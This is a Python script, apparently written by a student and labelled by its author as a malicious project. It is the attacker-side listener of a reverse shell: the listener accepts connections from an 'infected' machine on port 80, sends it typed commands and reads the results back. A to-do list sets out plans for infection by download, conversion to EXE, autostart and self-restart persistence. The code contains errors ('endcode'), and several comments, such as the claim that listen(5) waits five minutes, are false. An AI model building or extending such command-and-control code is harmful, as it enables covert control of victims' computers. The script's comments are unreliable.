import socket


#THIS IS A MALICIOUS PROJECT. ONCE COMPLETED PLEASE DO NOT OPEN ON YOU PERSONAL MACHINE 
#This is currently for a windows OS but I would like to change it to a Linux. This a majorly a test to see what we can learn from 
#how a virus like this works. 


#TO Luke <3 and Zach

'''
To Do List:
-Way to infect (Download The file). Convert Infector to EXE when done 
-File must start automatically
-File must also restart itself when stopped

- Currently you are able to connect to each other but only when hard coded. Possibly find a way to completely change that and have 
it so whenever any laptop can run the code 

-Make way to send and recieve code. From windows to linux must be a way to run code (Converting stings to Binary/byte like Object)


'''


Host = "0.0.0.0"  #Host listens on everything 
Port = 80           #HTTP Port

Size = 1024 * 128  #Size of message

message = "Thank You for Connecting!"

b_mess = bytes(message, 'ascii')

SEP = "<sep>"

s = socket.socket()  #Creating a socket 
s.bind((Host,Port)) # binds the host IP to port 

s.listen(5)                 #Waits 5 minutes for a connection before ending
print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 

while True:

    infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
    print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
   

    cwd = infected.recv(Size).decode()

    command = input(f"{cwd}$> ")
    infected.send(command.endcode())

    output = infected.recv(Size).decode()
    results, cwd = output.split(SEP)


    print("Current working directory: ",cwd)
   
    infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to 
    infected.close() #Cuts connection

